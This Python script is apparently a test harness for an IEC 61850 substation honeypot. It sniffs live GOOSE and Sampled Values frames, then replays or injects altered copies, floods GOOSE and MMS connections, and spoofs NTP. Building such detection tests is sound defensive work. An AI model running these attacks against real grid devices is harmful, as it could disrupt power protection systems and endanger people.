#!/usr/bin/env python3
import time
import socket
import threading
from scapy.all import *

TARGET_IP = "10.0.0.2" # IP of IED1_XCBR
TARGET_MAC = "01:0c:cd:01:00:02" # GOOSE Multicast
TARGET_SV_MAC = "01:0c:cd:01:00:03" # SV Multicast
IFACE = "eth0"

def test_mms_unauthorized_write():
    print("[*] Running Test A12: MMS Unauthorized Write...")
    print("[-] To test MMS Unauthorized Writes, open the web client (http://localhost:5000),")
    print("[-] navigate to IED1_XCBR and change any SP (Setpoint) or CF parameter, e.g. Mod.stVal.")
    print("[-] It will be logged as UNAUTHORIZED_ATTACK because your IP != 192.168.1.10.\n")

def test_mms_file_upload_instructions():
    print("[*] Running Test A13-A18: Firmware/App Replacement...")
    print("[-] To test A13-A18 (firmware replace), use an MMS client to attempt a FileOpen or FileRename")
    print("[-] on a file named 'malware.bin', 'update.elf', or 'script.sh' against the honeypot.")
    print("[-] The honeypot will log `FIRMWARE_REPLACEMENT_ATTEMPT_A17_A18`.\n")

def test_ntp_spoofing():
    print("[*] Running Test A3-A4: Time Sync (NTP/PTP) Spoofing...")
    # Send a dummy UDP packet to port 123
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b'\x1b\x00\x00\x00' + b'\x00'*44, (TARGET_IP, 123))
        print("[-] Sent spoofed NTP payload to port 123.")
    except Exception as e:
        print("[!] NTP Spoofing failed:", e)

def capture_valid_goose():
    print("[*] Sniffing network for a valid GOOSE heartbeat from IED2...")
    pkts = sniff(iface=IFACE, filter=f"ether proto 0x88b8 and ether dst {TARGET_MAC}", count=1, timeout=15)
    if not pkts:
        print("[!] Could not capture GOOSE packet. Ensure IED2 is running.")
        return None
    print("[+] Captured valid GOOSE heartbeat to use as template!")
    return pkts[0]

def capture_valid_sv():
    print("\n[*] Sniffing network for a valid SV (Sampled Values) stream from IED3...")
    pkts = sniff(iface=IFACE, filter=f"ether proto 0x88ba and ether dst {TARGET_SV_MAC}", count=1, timeout=10)
    if not pkts:
        print("[!] Could not capture SV packet. Ensure IED3 is running.")
        return None
    print("[+] Captured valid SV packet to use as template!")
    return pkts[0]

def update_goose_sqnum(pkt, sqNum_diff=0, set_sqNum=None):
    b = bytearray(raw(pkt))
    # Keep stNum exactly identical to the heartbeat so honeypot thinks it's the same stream
    idx_sq = b.find(b'\x87\x01')
    if idx_sq != -1:
        if set_sqNum is not None:
            b[idx_sq+2] = set_sqNum & 0xff
        else:
            orig = b[idx_sq+2]
            b[idx_sq+2] = (orig + sqNum_diff) & 0xff
    return Ether(bytes(b))

def update_sv_smpcnt(pkt, smp_diff=0):
    b = bytearray(raw(pkt))
    # ASDU smpCnt is usually tag 0x82. It's often 2 bytes (0x82 0x02)
    idx = b.find(b'\x82\x02')
    if idx != -1:
        orig = (b[idx+2] << 8) + b[idx+3]
        new_val = (orig + smp_diff) & 0xffff
        b[idx+2] = (new_val >> 8) & 0xff
        b[idx+3] = new_val & 0xff
    else:
        # Try 1 byte (0x82 0x01)
        idx2 = b.find(b'\x82\x01')
        if idx2 != -1:
            orig = b[idx2+2]
            new_val = (orig + smp_diff) & 0xff
            b[idx2+2] = new_val
    return Ether(bytes(b))

def test_goose_replay(template_pkt):
    print("[*] Running Test A24: GOOSE Replay & stNum Spoofing...")
    # Send a packet with an older sqNum (e.g., origin - 5)
    pkt_replay = update_goose_sqnum(template_pkt, sqNum_diff=-5)
    sendp(pkt_replay, iface=IFACE, verbose=False)
    print("[-] Sent GOOSE Replay packet.")

def test_goose_injection_flood(template_pkt):
    print("[*] Running Test A23: GOOSE Injection Flood (< 10ms delta)...")
    # Send packets extremely fast with identical stNum and increasing sqNum
    pkts = [update_goose_sqnum(template_pkt, sqNum_diff=(i+1)) for i in range(5)]
    for pkt in pkts:
        sendp(pkt, iface=IFACE, verbose=False)
    print("[-] Sent GOOSE Injection burst.")

def test_sv_replay(template_pkt):
    print("[*] Running Test A2: SV Replay Attack...")
    # Send older SmpCnt
    pkt_replay = update_sv_smpcnt(template_pkt, smp_diff=-20)
    sendp(pkt_replay, iface=IFACE, verbose=False)
    print("[-] Sent SV Replay packet (A2).")

def test_sv_injection(template_pkt):
    print("[*] Running Test A1: SV Injection (Jump in SmpCnt)...")
    # SmpCnt jumps significantly without wrapping to 0
    pkt_inject = update_sv_smpcnt(template_pkt, smp_diff=100)
    sendp(pkt_inject, iface=IFACE, verbose=False)
    print("[-] Sent SV Injection packet (A1).")

def test_dos_goose(template_pkt):
    print("[*] Running Test A31-A32: GOOSE DoS Flood...")
    # Spam GOOSE to trigger GOOSE DoS limit
    pkts = [update_goose_sqnum(template_pkt, set_sqNum=(i%255)) for i in range(300)]
    for pkt in pkts:
        sendp(pkt, iface=IFACE, verbose=False)
    print("[-] Sent GOOSE DoS Flood.")

def test_dos_mms():
    print("\n[*] Running Test A33-A34, A37-A38: MMS/TCP DoS (Flood)...")
    def worker():
        for _ in range(80): 
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.05)
                s.connect((TARGET_IP, 102))
                s.close()
            except:
                pass
    threads = []
    for _ in range(40):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print("[-] Sent MMS TCP Connection Flood.")

if __name__ == "__main__":
    print(f"=== Starting vIED Honeypot Attack Simulator (Target: {TARGET_IP}) ===")
    
    test_mms_unauthorized_write()
    test_mms_file_upload_instructions()
    test_ntp_spoofing()
    time.sleep(1)
    
    template_goose = capture_valid_goose()
    if template_goose:
        test_goose_replay(template_goose)
        time.sleep(1)
        test_goose_injection_flood(template_goose)
        time.sleep(1)
        test_dos_goose(template_goose)
        time.sleep(1)
    
    template_sv = capture_valid_sv()
    if template_sv:
        test_sv_replay(template_sv)
        time.sleep(1)
        test_sv_injection(template_sv)
        time.sleep(1)
    
    test_dos_mms()
    print("\n[+] All tests completed.")
